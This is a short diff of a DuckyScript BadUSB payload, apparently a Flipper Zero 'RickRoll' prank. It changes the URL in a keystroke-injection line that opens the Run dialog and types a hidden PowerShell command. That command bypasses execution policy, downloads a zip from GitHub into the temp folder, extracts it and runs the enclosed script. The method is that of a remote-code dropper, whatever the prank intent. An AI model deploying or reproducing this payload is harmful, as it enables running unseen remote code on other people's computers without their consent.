@@ -10,5 +10,5 @@ REM     ------------------------------------------------------------------------
 DELAY 2000
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $U='https://github.com/HelloBongo/HelloBongo/raw/main/Assets/rr.zip';$Z="$env:TMP"+'\rr.zip';$D="$env:TMP"+'\rr';iwr -Uri $U -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force;powershell $D\rr.ps1
+STRING powershell -w h -NoP -NonI -Exec Bypass $U='https://github.com/HelloBongo/Flipper-Zero-BadUSB/raw/main/ADV-RickRoll/rr.zip';$Z="$env:TMP"+'\rr.zip';$D="$env:TMP"+'\rr';iwr -Uri $U -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force;powershell $D\rr.ps1
 ENTER
